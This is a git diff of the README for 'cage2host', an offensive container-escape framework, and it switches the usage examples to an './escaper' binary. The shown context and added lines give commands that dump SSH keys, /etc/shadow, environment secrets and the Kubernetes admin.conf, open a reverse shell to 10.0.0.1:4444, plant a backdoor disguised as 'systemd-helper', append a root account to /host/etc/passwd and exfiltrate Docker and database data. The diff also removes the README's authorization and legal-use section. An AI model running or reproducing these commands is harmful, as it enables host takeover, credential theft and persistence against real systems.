@@ -1,6 +1,5 @@
-## Cage2Host Advanced Container Escape Automation Framework
-![task_01kakjc7pcf2vrdb5c4bn1yy9c_1763741081_img_1](https://github.com/user-attachments/assets/bd76303e-8442-4f51-b4d2-86993e65d46c)
-
+# 🔓 cage2host
+![final](https://github.com/user-attachments/assets/d50a67e1-630e-4e40-9ba3-78f805fba9ba)
 
 <div align="center">
 
@@ -75,30 +74,30 @@ The framework abstracts the complexity of container breakout techniques into reu
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
-│                      cage2host Framework                     │
+│                      cage2host Framework                    │
 ├─────────────────────────────────────────────────────────────┤
-│                                                               │
-│  ┌──────────────────┐              ┌──────────────────┐    │
-│  │   Utility Mode   │              │   Random Mode    │    │
-│  │                  │              │                  │    │
-│  │ • Payload Engine │              │ • Direct Exec    │    │
-│  │ • Template Inject│              │ • Auto-chaining  │    │
-│  │ • Task Automation│              │ • Module Scanner │    │
-│  └────────┬─────────┘              └────────┬─────────┘    │
-│           │                                  │               │
-│           └──────────────┬───────────────────┘               │
-│                          ▼                                   │
+│                                                             │
+│  ┌──────────────────┐              ┌──────────────────┐     │
+│  │   Utility Mode   │              │   Random Mode    │     │
+│  │                  │              │                  │     │
+│  │ • Payload Engine │              │ • Direct Exec    │     │
+│  │ • Template Inject│              │ • Auto-chaining  │     │
+│  │ • Task Automation│              │ • Module Scanner │     │
+│  └────────┬─────────┘              └────────┬─────────┘     │
+│           │                                  │              │
+│           └──────────────┬───────────────────┘              │
+│                          ▼                                  │
 │           ┌──────────────────────────────┐                  │
-│           │    Exploitation Core Layer    │                  │
-│           │                                │                  │
-│           │ • Route Manager               │                  │
-│           │ • Config Parser               │                  │
-│           │ • Output Handler              │                  │
-│           └──────────────┬─────────────────┘                  │
-│                          ▼                                   │
+│           │    Exploitation Core Layer   │                  │
+│           │                              │                  │
+│           │ • Route Manager              │                  │
+│           │ • Config Parser              │                  │
+│           │ • Output Handler             │                  │
+│           └──────────────┬───────────────┘                  │
+│                          ▼                                  │
 │           ┌──────────────────────────────┐                  │
 │           │      Exploit Modules         │                  │
-│           │                                │                  │
+│           │                              │                  │
 │           │ ├─ Docker Socket Exploits    │                  │
 │           │ ├─ Privileged Container Esc  │                  │
 │           │ ├─ Mount-based Techniques    │                  │
@@ -148,22 +147,25 @@ make build
 
 # Verify installation
 ./start.sh --help
+# or using builded binary
+./escaper
 ```
 
 ### Advanced Build Options
 
 ```bash
-# Build with optimization
-make build OPTIMIZE=true
+[INFO] Available commands:
+  make install     – Build modules & routing
+  make run         – Launch main tool
+  make random      – Launch --random-mode
+  make utility     – Launch --utility-mode
+  make auto        – Launch auto-mode
+  make list        – Show modules
+  make exploits    – Show exploits
+  make build       – Build standalone binary
+  make clean       – Remove routing table
+  make rebuild     – Clean + install
 
-# Build standalone binary
-make binary
-
-# Install system-wide (requires root)
-sudo make install-system
-
-# Clean build artifacts
-make clean
 ```
 
 ---
@@ -247,19 +249,19 @@ dump_ssh='tar czf - /host/root/.ssh /host/home/*/.ssh 2>/dev/null | base64 -w0'
 
 ```bash
 # Display help and usage
-./utility/utility.sh --help
+./escaper --utility-mode --help
 
 # List available exploitation vectors
-./utility/utility.sh --list-vulns
+./escaper --utility-mode --list-vulns
 
 # List available payload templates
-./utility/utility.sh --list-payloads
+./escaper --utility-mode --list-payloads
 
 # Execute command via specific vector
-./utility/utility.sh --vuln <vector> --cmd "<command>"
+../escaper --utility-mode  --vuln <vector> --cmd "<command>"
 
 # Use predefined payload
-./utility/utility.sh --vuln <vector> --<payload_key> [OPTIONS]
+./escaper --utility-mode --vuln <vector> --<payload_key> [OPTIONS]
 ```
 
 ### Tactical Examples
@@ -268,13 +270,13 @@ dump_ssh='tar czf - /host/root/.ssh /host/home/*/.ssh 2>/dev/null | base64 -w0'
 
 ```bash
 # Initial system enumeration
-./utility/utility.sh --vuln socket --run
+./escaper --utility-mode  --vuln socket --run
 
 # Network discovery
-./utility/utility.sh --vuln privileged_container --cmd "ip route; arp -a; netstat -tuln"
+./escaper --utility-mode  --vuln privileged_container --cmd "ip route; arp -a; netstat -tuln"
 
 # Process enumeration
-./utility/utility.sh --vuln socket --cmd "ps auxf; systemctl list-units"
+./escaper --vuln socket --cmd "ps auxf; systemctl list-units"
 ```
 
 #### Credential Harvesting
@@ -284,41 +286,41 @@ dump_ssh='tar czf - /host/root/.ssh /host/home/*/.ssh 2>/dev/null | base64 -w0'
 ./utility/utility.sh --vuln socket --dump_ssh --out ssh-creds.b64
 
 # Extract shadow file
-./utility/utility.sh --vuln privileged_container \
+./escaper --vuln privileged_container \
   --extract_file --source /etc/shadow --decode-out shadow.txt
 
 # Dump environment variables
-./utility/utility.sh --vuln socket --cmd "env; cat /proc/*/environ | tr '\0' '\n'"
+./escaper --vuln socket --cmd "env; cat /proc/*/environ | tr '\0' '\n'"
 ```
 
 #### Persistence & Post-Exploitation
 
 ```bash
 # Establish reverse shell
-./utility/utility.sh --vuln socket --revshell --ip 10.0.0.1 --port 4444
+./escaper --vuln socket --revshell --ip 10.0.0.1 --port 4444
 
 # Upload backdoor
-./utility/utility.sh --vuln privileged_container \
+./escaper--vuln privileged_container \
   --upload_file --file /local/backdoor.elf --dest /usr/local/bin/systemd-helper
 
 # Modify system files
-./utility/utility.sh --vuln socket --cmd "echo 'attacker:x:0:0::/root:/bin/bash' >> /host/etc/passwd"
+./escaper --vuln socket --cmd "echo 'attacker:x:0:0::/root:/bin/bash' >> /host/etc/passwd"
 ```
 
 #### Data Exfiltration
 
 ```bash
 # Extract sensitive files
-./utility/utility.sh --vuln socket \
+./escaper --vuln socket \
   --extract_file --source /etc/kubernetes/admin.conf --out k8s-admin.b64
 
 # Compress and exfiltrate directory
-./utility/utility.sh --vuln privileged_container \
+./escaper --vuln privileged_container \
   --cmd "tar czf - /host/var/lib/docker 2>/dev/null | base64 -w0" \
   --out docker-data.tar.gz.b64
 
 # Database dump
-./utility/utility.sh --vuln socket \
+./escaper --vuln socket \
   --cmd "mysqldump -u root -p\$(cat /host/root/.mysql_password) --all-databases | base64 -w0"
 ```
 
@@ -547,46 +549,15 @@ fi
 echo "id" | base64 | xargs ./bin/your-exploit.sh
 
 # Test via Utility Mode
-./utility/utility.sh --vuln your_exploit --cmd "whoami"
+./escaper --vuln your_exploit --cmd "whoami"
 
 # Test with complex payload
-./utility/utility.sh --vuln your_exploit --extract_file --source /etc/passwd
+./escaper--vuln your_exploit --extract_file --source /etc/passwd
 ```
 
 ---
 
 ## 🎨 Customization & Theming
-
-### Theme System
-
-Themes control the visual presentation of framework output:
-
-```bash
-# themes/custom-theme.sh
-
-# Color definitions
-export RED="\033[1;31m"
-export GRN="\033[1;32m"
-export YEL="\033[1;33m"
-export CYN="\033[1;36m"
-export RST="\033[0m"
-
-# Helper functions
-success() { echo -e "${GRN}[+]${RST} $*"; }
-error()   { echo -e "${RED}[-]${RST} $*"; }
-info()    { echo -e "${CYN}[*]${RST} $*"; }
-warn()    { echo -e "${YEL}[!]${RST} $*"; }
-
-# Banner function
-banner() {
-    cat << 'EOF'
-╔═══════════════════════════════════════╗
-║       CAGE2HOST FRAMEWORK v2.0        ║
-║   Advanced Container Escape Toolkit   ║
-╚═══════════════════════════════════════╝
-EOF
-}
-```
 
 ### Applying Custom Theme
 
@@ -597,75 +568,7 @@ source themes/custom-theme.sh
 
 ---
 
-## 📊 Project Structure
-
-```
-cage2host/
-├── bin/                          # Core exploit binaries
-│   ├── interactive-socket.sh     # Docker socket interactive exploit
-│   ├── privileged.sh             # Privileged container escape
-│   └── custom-exploits/          # User-defined exploits
-│
-├── build/                        # Build artifacts
-│   ├── bin/                      # Compiled binaries
-│   └── cache/                    # Build cache
-│
-├── config/                       # Framework configuration
-│   ├── payload.conf              # Payload template definitions
-│   ├── vuln.conf                 # Vulnerability-to-exploit mappings
-│   ├── routes.conf               # Auto-generated module routes
-│   ├── fun.conf                  # Easter eggs and extras
-│   └── settings.conf             # Global framework settings
-│
-├── core/                         # Framework core components
-│   ├── main.sh                   # Random mode entry point
-│   ├── routes.sh                 # Route management system
-│   ├── build-routes.sh           # Route builder utility
-│   ├── static-routes.sh          # Static route definitions
-│   └── utils.sh                  # Common utility functions
-│
-├── modules/                      # Exploitation modules
-│   ├── auto-mode/                # Auto-chain execution modules
-│   ├── mounts/                   # Mount-based exploits
-│   ├── unix-socket/              # Unix socket techniques
-│   ├── kubernetes/               # K8s-specific exploits
-│   └── bin/                      # Module binaries (socat, etc.)
-│
-├── themes/                       # UI themes
-│   ├── theme.sh                  # Default theme
-│   ├── ninja-theme.sh            # Alternative theme
-│   └── theme-template.sh         # Theme development template
-│
-├── utility/                      # Utility mode components
-│   ├── utility.sh                # Main utility orchestrator
-│   ├── parser.sh                 # Output parsing engine
-│   └── output/                   # Command output storage
-│       ├── raw/                  # Raw base64 outputs
-│       └── decoded/              # Decoded outputs
-│
-├── docs/                         # Documentation
-│   ├── EXPLOITATION-GUIDE.md     # Exploitation techniques
-│   ├── DEVELOPMENT.md            # Development guide
-│   └── PAYLOADS.md               # Payload reference
-│
-├── Makefile                      # Build automation
-├── start.sh                      # Main framework entry point
-├── LICENSE                       # License information
-└── README.md                     # This file
-```
-
----
-
 ## 🔒 Operational Security Considerations
-
-### Legal & Ethical Use
-
-⚠️ **CRITICAL**: This framework is designed exclusively for authorized security assessments and research.
-
-- **Authorization Required**: Obtain explicit written permission before testing any system
-- **Scope Adherence**: Stay within defined engagement boundaries
-- **Data Handling**: Follow responsible disclosure practices
-- **Documentation**: Maintain detailed logs of all activities for reporting
 
 ### Technical Safety
 
@@ -692,6 +595,93 @@ cage2host/
 - **Resource Overhead**: Some exploits may impact system performance
 
 ---
+# Universal Module Runner
+
+This script allows you to execute any type of file — Bash, Python, Go, compiled binaries, etc. — using the interpreter specified in its shebang. It is designed to be part of the `escaper2` toolkit but can also be used standalone.
+
+---
+
+## Usage
+
+### Run any file format
+
+```bash
+./start.sh --random-mode --module MOD-001 path/to/script.py
+````
+
+**Example:**
+
+```bash
+./start.sh --random-mode --module MOD-001 unix-socket/bin/black.go
+```
+
+Output:
+
+```
+[INFO] Running file using its shebang → /home/b7z/project/escaper2/modules/unix-socket/bin/black.py
+[ERROR] Missing shebang.
+The script cannot be auto-executed without specifying interpreter.
+Add something like:
+  #!/usr/bin/env python3
+  #!/usr/bin/env bash
+```
+
+---
+
+### Handle directories
+
+If a directory is given instead of a file, the runner will report an error:
+
+```bash
+./start.sh --random-mode --module MOD-001 unix-socket/bin/
+```
+
+Output:
+
+```
+[ERROR] File not found: unix-socket/bin/
+[DEBUG] Looked in: /home/b7z/project/escaper2/modules/unix-socket/bin/
+```
+
+---
+
+## Requirements
+
+* The file must exist and be readable.
+* Scripts require a valid shebang (e.g., `#!/usr/bin/env python3` or `#!/usr/bin/env bash`).
+* Executable bit is automatically set if missing.
+
+---
+
+## Features
+
+* Supports any type of script or binary file.
+* Automatically resolves paths relative to the project root.
+* Provides informative error messages:
+
+  * Missing file
+  * Directory instead of file
+  * Missing shebang
+* Runs the file exactly as the system would using the shebang interpreter.
+
+---
+
+## Notes
+
+* If the script fails with “Missing shebang,” you must add a shebang line at the top of the file.
+* Paths are resolved relative to the project root, so you can pass files like `modules/unix-socket/bin/black.py`.
+
+---
+
+## Example Shebangs
+
+* Bash: `#!/usr/bin/env bash`
+* Python 3: `#!/usr/bin/env python3`
+* Go compiled binary: no shebang needed (ensure executable)
+
+```
+
+```
 
 ## 🛣️ Roadmap
 
@@ -741,7 +731,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Disclaimer**: The authors and contributors assume no liability for misuse or damage caused by this software. Users are solely responsible for compliance with applicable laws and regulations.
 
----
 
 ## 📚 Additional Resources
 
@@ -752,8 +741,19 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
+<div align="center">
+
 **cage2host** - *Break Free, Stay Hidden*
 
 Made with ⚡ by security researchers, for security researchers
 
-[Report Bug](https://github.com/bohmiiidd/cage2host/issues) • [Request Feature](https://github.com/bohmiiidd/cage2host/issues) • [Documentation](https://github.com/bohmiiidd/cage2host/wiki)
+[Report Bug](https://github.com/yourusername/cage2host/issues) • [Request Feature](https://github.com/yourusername/cage2host/issues) • [Documentation](https://github.com/yourusername/cage2host/wiki)
+
+</div
+
+---
+
+## 🙏 Acknowledgments
+
+Research and community contributions around container escapes have informed this work.
+
